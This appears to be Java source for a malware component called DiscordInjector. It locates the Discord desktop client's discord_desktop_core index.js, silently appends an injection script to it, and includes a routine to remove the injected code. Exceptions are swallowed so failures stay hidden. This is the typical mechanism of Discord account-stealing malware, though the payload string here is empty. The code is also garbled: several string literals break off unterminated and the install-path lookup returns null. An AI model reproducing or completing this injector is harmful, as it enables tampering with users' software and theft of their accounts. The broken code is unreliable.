import com.sun.jna.platform.win32.WinReg;
import java.io.File;
import java.io.Serializable;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;

public class DiscordInjector {

    private static final String injectionScript;

    private static final byte[] injectionScriptBytes;

    private static volatile boolean injectionActive;

    private static volatile int injectionAttempts;

    public static void inject(String discordPath) {
        try {
            if (injectionActive) return;

            File discordDir = new File(discordPath);
            File[] appDirs = discordDir.listFiles(f ->
                f.isDirectory() && f.getName().startsWith("app-")
            );

            if (appDirs == null || appDirs.length == 0) return;

            java.util.Arrays.sort(appDirs, (a, b) -> b.getName().compareTo(a.getName()));
            File latestAppDir = appDirs[0];

            File indexJs = findIndexJs(latestAppDir);
            if (indexJs == null) return;

            String currentContent = new String(
                Files.readAllBytes(indexJs.toPath()),
                StandardCharsets.UTF_8
            );

            if (currentContent.contains("
                injectionActive = true;
                return;
            }

            String injected = currentContent + "\n
            Files.write(indexJs.toPath(), injected.getBytes(StandardCharsets.UTF_8));

            injectionActive = true;
            injectionAttempts++;

        } catch (Exception e) {

        }
    }

    public static void removeInjection(String discordPath) {
        try {
            File discordDir = new File(discordPath);
            File[] appDirs = discordDir.listFiles(f ->
                f.isDirectory() && f.getName().startsWith("app-")
            );

            if (appDirs == null) return;

            for (File appDir : appDirs) {
                File indexJs = findIndexJs(appDir);
                if (indexJs == null) continue;

                String content = new String(
                    Files.readAllBytes(indexJs.toPath()),
                    StandardCharsets.UTF_8
                );

                int markerIdx = content.indexOf("
                if (markerIdx != -1) {
                    String cleaned = content.substring(0, markerIdx).trim();
                    Files.write(indexJs.toPath(), cleaned.getBytes(StandardCharsets.UTF_8));
                }
            }

            injectionActive = false;

        } catch (Exception e) {

        }
    }

    private static File findIndexJs(File appDir) {
        try {
            File modulesDir = new File(appDir, "modules");
            if (!modulesDir.exists()) return null;

            File[] coreDirs = modulesDir.listFiles(f ->
                f.isDirectory() && f.getName().startsWith("discord_desktop_core")
            );

            if (coreDirs == null || coreDirs.length == 0) return null;

            java.util.Arrays.sort(coreDirs, (a, b) -> b.getName().compareTo(a.getName()));

            File coreDir = new File(coreDirs[0], "discord_desktop_core");
            File indexJs = new File(coreDir, "index.js");

            return indexJs.exists() ? indexJs : null;

        } catch (Exception e) {
            return null;
        }
    }

    public static String getDiscordInstallPath() {
        try {

            return null;
        } catch (Exception e) {
            return null;
        }
    }

    public static boolean isInjected() {
        return injectionActive;
    }

    static {

        injectionScript = "";
        injectionScriptBytes = new byte[0];
        injectionActive = false;
        injectionAttempts = 0;
    }
}